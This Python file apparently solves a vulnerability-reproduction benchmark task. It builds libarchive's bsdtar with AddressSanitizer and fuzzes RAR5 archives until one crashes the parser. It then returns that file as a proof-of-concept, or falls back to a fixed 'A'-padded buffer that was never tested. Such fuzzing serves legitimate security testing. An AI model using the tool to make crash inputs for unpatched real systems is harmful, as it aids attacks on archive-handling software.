import os
import tarfile
import tempfile
import shutil
import subprocess
import random
import time
import binascii


class Solution:
    def solve(self, src_path: str) -> bytes:
        rar5_magic = b"Rar!\x1a\x07\x01\x00"
        tmp_root = tempfile.mkdtemp(prefix="rar5_poc_")
        try:
            # Extract the vulnerable source tarball
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    self._safe_extract(tar, tmp_root)
            except Exception:
                return self._fallback_poc(rar5_magic)

            project_root = self._find_project_root(tmp_root)
            if project_root is None:
                return self._fallback_poc(rar5_magic)

            # Try building target with ASAN first
            bsdtar_path = self._build_bsdtar(project_root, use_asan=True)
            use_asan = True
            if not bsdtar_path:
                # Fallback: build without ASAN if ASAN build fails
                bsdtar_path = self._build_bsdtar(project_root, use_asan=False)
                use_asan = False
            if not bsdtar_path:
                return self._fallback_poc(rar5_magic)

            # Try to find a RAR5 seed archive in the source tree
            seed_bytes = self._find_rar5_seed(project_root, rar5_magic)

            # Fuzz around the seed (or random RAR5 header) to induce the crash
            poc = self._fuzz_for_rar5_crash(bsdtar_path, seed_bytes, rar5_magic, use_asan)
            if poc is not None:
                return poc

            # If everything fails, return a simple synthetic RAR5-like buffer
            return self._fallback_poc(rar5_magic)
        finally:
            shutil.rmtree(tmp_root, ignore_errors=True)

    # ----------------- Helper methods -----------------

    def _safe_extract(self, tar: tarfile.TarFile, path: str) -> None:
        base = os.path.abspath(path)
        for member in tar.getmembers():
            member_path = os.path.join(path, member.name)
            abs_member_path = os.path.abspath(member_path)
            if os.path.commonprefix([base, abs_member_path]) != base:
                continue
            tar.extract(member, path)

    def _find_project_root(self, base: str) -> str:
        # Prefer a single top-level directory if present
        try:
            entries = [os.path.join(base, e) for e in os.listdir(base)]
        except OSError:
            return base
        dirs = [e for e in entries if os.path.isdir(e)]
        root = base
        if len(dirs) == 1:
            root = dirs[0]

        if (
            os.path.exists(os.path.join(root, "configure"))
            or os.path.exists(os.path.join(root, "CMakeLists.txt"))
            or os.path.exists(os.path.join(root, "Makefile"))
        ):
            return root

        for r, _, files in os.walk(root):
            if "configure" in files or "CMakeLists.txt" in files or "Makefile" in files:
                return r
        return root

    def _build_bsdtar(self, root: str, use_asan: bool) -> str | None:
        env = os.environ.copy()
        asan_cflags = "-fsanitize=address -fno-omit-frame-pointer -g -O1"
        asan_ldflags = "-fsanitize=address"
        if use_asan:
            env["CFLAGS"] = (env.get("CFLAGS", "") + " " + asan_cflags).strip()
            env["CXXFLAGS"] = (env.get("CXXFLAGS", "") + " " + asan_cflags).strip()
            env["LDFLAGS"] = (env.get("LDFLAGS", "") + " " + asan_ldflags).strip()

        try:
            if os.path.exists(os.path.join(root, "configure")):
                subprocess.run(
                    ["./configure"],
                    cwd=root,
                    env=env,
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                subprocess.run(
                    ["make", "-j4"],
                    cwd=root,
                    env=env,
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            elif os.path.exists(os.path.join(root, "CMakeLists.txt")):
                build_dir = os.path.join(root, "build")
                os.makedirs(build_dir, exist_ok=True)
                cmake_cmd = ["cmake", "-DCMAKE_BUILD_TYPE=Debug"]
                if use_asan:
                    cmake_cmd.append(f"-DCMAKE_C_FLAGS={asan_cflags}")
                    cmake_cmd.append(f"-DCMAKE_CXX_FLAGS={asan_cflags}")
                    cmake_cmd.append(f"-DCMAKE_EXE_LINKER_FLAGS={asan_ldflags}")
                cmake_cmd.append("..")
                subprocess.run(
                    cmake_cmd,
                    cwd=build_dir,
                    env=env,
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                subprocess.run(
                    ["cmake", "--build", ".", "--", "-j4"],
                    cwd=build_dir,
                    env=env,
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                root = build_dir
            else:
                subprocess.run(
                    ["make", "-j4"],
                    cwd=root,
                    env=env,
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
        except (subprocess.CalledProcessError, FileNotFoundError):
            return None

        return self._find_executable(root, "bsdtar")

    def _find_executable(self, root: str, name: str) -> str | None:
        for r, _, files in os.walk(root):
            if name in files:
                path = os.path.join(r, name)
                if os.access(path, os.X_OK):
                    return path
        return None

    def _decode_uu_file(self, text: str) -> bytes:
        out = bytearray()
        in_body = False
        for line in text.splitlines():
            if not in_body:
                if line.startswith("begin "):
                    in_body = True
                continue
            if line.strip() == "end":
                break
            try:
                out.extend(binascii.a2b_uu(line.encode("latin1")))
            except binascii.Error:
                continue
        return bytes(out)

    def _find_rar5_seed(self, root: str, rar5_magic: bytes) -> bytes | None:
        # First, look for actual .rar files
        for r, _, files in os.walk(root):
            for name in files:
                low = name.lower()
                if low.endswith(".rar") or low.endswith(".rar5"):
                    path = os.path.join(r, name)
                    try:
                        with open(path, "rb") as f:
                            header = f.read(len(rar5_magic))
                            if header == rar5_magic:
                                f.seek(0)
                                return f.read()
                    except OSError:
                        continue

        # Then, look for uuencoded RAR archives (e.g., *.rar.uu)
        for r, _, files in os.walk(root):
            for name in files:
                low = name.lower()
                if low.endswith(".rar.uu") or low.endswith(".uu"):
                    path = os.path.join(r, name)
                    try:
                        with open(path, "rb") as f:
                            text = f.read().decode("latin1", errors="ignore")
                        data = self._decode_uu_file(text)
                        if data.startswith(rar5_magic):
                            return data
                    except OSError:
                        continue

        return None

    def _mutate_bytes(self, base: bytearray, min_offset: int) -> bytes:
        data = bytearray(base)
        if len(data) <= min_offset + 1:
            return bytes(data)
        max_mut = max(4, min(64, len(data) - min_offset))
        n = random.randint(1, max_mut)
        for _ in range(n):
            pos = random.randint(min_offset, len(data) - 1)
            data[pos] = random.randint(0, 255)

        # Occasionally change length a bit
        if random.random() < 0.3 and len(data) < 2048:
            extra_len = random.randint(1, 16)
            data.extend(os.urandom(extra_len))
        if random.random() < 0.3 and len(data) > min_offset + 32:
            cut = random.randint(1, min(16, len(data) - min_offset))
            del data[-cut:]
        return bytes(data)

    def _fuzz_for_rar5_crash(
        self,
        bsdtar_path: str,
        seed_bytes: bytes | None,
        rar5_magic: bytes,
        use_asan: bool,
    ) -> bytes | None:
        random.seed(0)

        if seed_bytes and seed_bytes.startswith(rar5_magic):
            base = bytearray(seed_bytes)
        else:
            # Generic base: RAR5 signature followed by random padding
            base = bytearray(rar5_magic + os.urandom(512))

        min_offset = 64 if len(base) > 64 else 8

        start_time = time.time()
        max_time = 30.0
        max_iters = 1000
        poc_data = None

        run_dir = tempfile.mkdtemp(prefix="rar5_run_")
        try:
            for _ in range(max_iters):
                if time.time() - start_time > max_time:
                    break

                data = self._mutate_bytes(base, min_offset)
                poc_path = os.path.join(run_dir, "poc.rar")
                try:
                    with open(poc_path, "wb") as f:
                        f.write(data)
                except OSError:
                    continue

                try:
                    proc = subprocess.run(
                        [bsdtar_path, "-xf", poc_path],
                        cwd=run_dir,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=1.0,
                    )
                except subprocess.TimeoutExpired:
                    shutil.rmtree(run_dir, ignore_errors=True)
                    run_dir = tempfile.mkdtemp(prefix="rar5_run_")
                    continue

                stderr = proc.stderr.decode("latin1", errors="ignore")

                if use_asan:
                    if (
                        "AddressSanitizer" in stderr
                        and (
                            "rar5" in stderr
                            or "rar5_decode" in stderr
                            or "archive_read_support_format_rar5" in stderr
                            or "rar5.c" in stderr
                        )
                    ):
                        poc_data = bytes(data)
                        break
                else:
                    rc = proc.returncode
                    if rc < 0 or rc >= 128:
                        if (
                            "Segmentation fault" in stderr
                            or "core dumped" in stderr
                            or "stack-buffer-overflow" in stderr
                            or "AddressSanitizer" in stderr
                            or "rar5" in stderr
                        ):
                            poc_data = bytes(data)
                            break

                for name in os.listdir(run_dir):
                    path = os.path.join(run_dir, name)
                    if name == "poc.rar":
                        continue
                    if os.path.isdir(path):
                        shutil.rmtree(path, ignore_errors=True)
                    else:
                        try:
                            os.remove(path)
                        except OSError:
                            pass

            return poc_data
        finally:
            shutil.rmtree(run_dir, ignore_errors=True)

    def _fallback_poc(self, rar5_magic: bytes) -> bytes:
        total_len = 524
        if total_len <= len(rar5_magic):
            return rar5_magic
        pad_len = total_len - len(rar5_magic)
        return rar5_magic + b"A" * pad_len
